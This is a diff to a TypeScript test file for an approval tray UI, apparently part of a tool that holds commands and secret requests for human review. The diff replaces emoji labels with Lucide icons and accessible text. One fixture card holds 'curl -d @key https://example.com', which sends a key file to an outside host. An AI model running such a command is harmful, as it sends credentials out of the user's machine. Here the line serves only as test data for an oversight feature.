@@ -115,6 +115,9 @@ const rows = () => within(tray()).getAllByRole("listitem")
 // The third row of the tray list.
 const row = () => rows()[2]
 const act = (name: string) => tray().querySelector<HTMLElement>(`[data-act="${name}"]`)
+// The row icon part of a tray row: the Lucide icon and its hidden word.
+const rowIcon = (r: HTMLElement) => r.querySelector<HTMLElement>('[data-slot="row-icon"]')!
+const cls = (r: HTMLElement) => rowIcon(r).querySelector("svg")!.getAttribute("class")
 
 describe("WaitingTray", () => {
   it("shows the oldest card in full and each other card as a row", async () => {
@@ -125,7 +128,16 @@ describe("WaitingTray", () => {
     expect(tray().contains(full)).toBe(true)
     expect(full.textContent).toContain("rm -rf build/")
     expect(rows()).toHaveLength(3)
-    expect(rows().map((r) => r.firstElementChild?.textContent?.trim())).toEqual(["🔒", "🔑", "🛡"])
+    expect(rows().map((r) => rowIcon(r).querySelector("svg")!.getAttribute("class"))).toEqual([
+      expect.stringContaining("lucide-lock"),
+      expect.stringContaining("lucide-key-round"),
+      expect.stringContaining("lucide-shield"),
+    ])
+    expect(rows().map((r) => rowIcon(r).querySelector(".sr-only")!.textContent)).toEqual([
+      "human-only approval",
+      "sign-in",
+      "approval",
+    ])
     expect(rows()[0].textContent).toContain("sudo reboot")
     expect(rows()[0].textContent).toContain("now")
     expect(rows()[1].textContent).toContain("Chrome on Android · 10.8.0.5 · check code 4821")
@@ -142,16 +154,22 @@ describe("WaitingTray", () => {
       within(row())
         .getAllByRole("button")
         .map((b) => b.textContent?.trim()),
-    ).toEqual(["Show ▾"])
-    await user.click(within(row()).getByRole("button", { name: "Show ▾" }))
+    ).toEqual(["Show"])
+    const show = within(row()).getByRole("button", { name: "Show" })
+    expect(show.getAttribute("aria-expanded")).toBe("false")
+    expect(show.querySelector("svg.lucide-chevron-right")).not.toBeNull()
+    await user.click(show)
     expect(row().querySelector("#tray-card-a3")).not.toBeNull()
-    expect(row().textContent).toContain("✅ Once")
-    await user.click(within(row()).getByRole("button", { name: "Hide ▴" }))
+    expect(row().textContent).toContain("Once")
+    const hide = within(row()).getByRole("button", { name: "Hide" })
+    expect(hide.getAttribute("aria-expanded")).toBe("true")
+    expect(hide.querySelector("svg.lucide-chevron-down")).not.toBeNull()
+    await user.click(hide)
     expect(
       within(row())
         .getAllByRole("button")
         .map((b) => b.textContent?.trim()),
-    ).toEqual(["Show ▾"])
+    ).toEqual(["Show"])
   })
 
   it("approves all once after a confirm that lists each command as text and starts on Cancel", async () => {
@@ -159,14 +177,14 @@ describe("WaitingTray", () => {
     anchor()
     render(WaitingTray)
     await flushPromises()
-    expect(act("approve-all")!.textContent?.trim()).toBe("✅ Approve all once…")
+    expect(act("approve-all")!.textContent?.trim()).toBe("Approve all once…")
     await user.click(act("approve-all")!)
     await flushPromises()
     expect(confirm).toHaveBeenCalledWith({
       title: "Approve 2 commands once?",
       body: "Each answer is “once”. Human-only actions stay open.",
       items: ["rm -rf build/", "go test ./..."],
-      confirmLabel: "✅ Approve all once",
+      confirmLabel: "Approve all once",
       focus: "cancel",
     })
     expect(api).toHaveBeenCalledWith("POST", "/api/cards/bulk", {
@@ -189,7 +207,7 @@ describe("WaitingTray", () => {
         items: ["rm -rf build/", "go test ./..."],
         body:
           "Each answer is “once”. Human-only actions stay open.\n" +
-          "1 📤 send with findings stays open. Answer it on its card.",
+          "1 send with findings stays open. Answer it on its card.",
       }),
     )
     expect(api).toHaveBeenCalledWith("POST", "/api/cards/bulk", {
@@ -202,7 +220,7 @@ describe("WaitingTray", () => {
     anchor()
     render(WaitingTray)
     await flushPromises()
-    expect(within(tray()).getByText("1 🔒 human-only approval stays open.")).toBeTruthy()
+    expect(within(tray()).getByText("1 human-only approval stays open.")).toBeTruthy()
   })
 
   it("posts only the ids that the confirm showed", async () => {
@@ -255,8 +273,8 @@ describe("WaitingTray", () => {
     anchor()
     render(WaitingTray)
     await flushPromises()
-    await user.click(within(rows()[1]).getByRole("button", { name: "Show ▾" }))
-    await user.click(within(rows()[1]).getByRole("button", { name: "✅ Allow" }))
+    await user.click(within(rows()[1]).getByRole("button", { name: "Show" }))
+    await user.click(within(rows()[1]).getByRole("button", { name: "Allow" }))
     expect(api).toHaveBeenCalledWith("POST", "/api/cards/s1", {
       answer: "allow",
       choices: [],
@@ -313,6 +331,69 @@ describe("WaitingTray", () => {
     await user.click(within(toaster).getByRole("button", { name: "Undo" }))
     expect(ui.trayOpen).toBe(true)
     toaster.remove()
+  })
+
+  it("gives each row the icon of its card kind and finds a send card by its header", async () => {
+    anchor()
+    cards.open = [
+      approval("a1", "ls"),
+      send("a5", "curl -d @key https://example.com"),
+      {
+        ...base,
+        id: "q1",
+        kind: "clarify",
+        header: "❓ Question",
+        command: "",
+        summary: "Which folder?",
+        human_only: false,
+        answers: [],
+      },
+      {
+        ...base,
+        id: "k1",
+        kind: "secret",
+        header: "🔑 Secret needed: PYPI_TOKEN",
+        command: "",
+        secret_name: "PYPI_TOKEN",
+        human_only: false,
+        answers: ["deny"],
+      },
+      {
+        ...base,
+        id: "p1",
+        kind: "pin",
+        header: "🔑 Give GH_TOKEN to this program?",
+        command: "",
+        secret_name: "GH_TOKEN",
+        human_only: false,
+        answers: ["deny", "allow"],
+      },
+      {
+        ...base,
+        id: "p2",
+        kind: "pin",
+        header: "🔑 Give GH_TOKEN to this program?",
+        command: "",
+        secret_name: "GH_TOKEN",
+        human_only: true,
+        answers: ["deny", "allow"],
+      },
+    ] as never
+    render(WaitingTray)
+    await flushPromises()
+    expect(cls(rows()[0])).toContain("lucide-send")
+    expect(cls(rows()[1])).toContain("lucide-circle-help")
+    expect(cls(rows()[2])).toContain("lucide-key-round")
+    expect(cls(rows()[3])).toContain("lucide-key-round")
+    expect(cls(rows()[4])).toContain("lucide-lock")
+    expect(rows().map((r) => rowIcon(r).querySelector(".sr-only")!.textContent)).toEqual([
+      "send",
+      "question",
+      "secret",
+      "program secret",
+      "human-only approval",
+    ])
+    for (const r of rows()) expect(r.textContent).not.toMatch(/📤|🔒|❓|🔑|🛡|▾|▴/)
   })
 
   it("shows the empty hint", async () => {
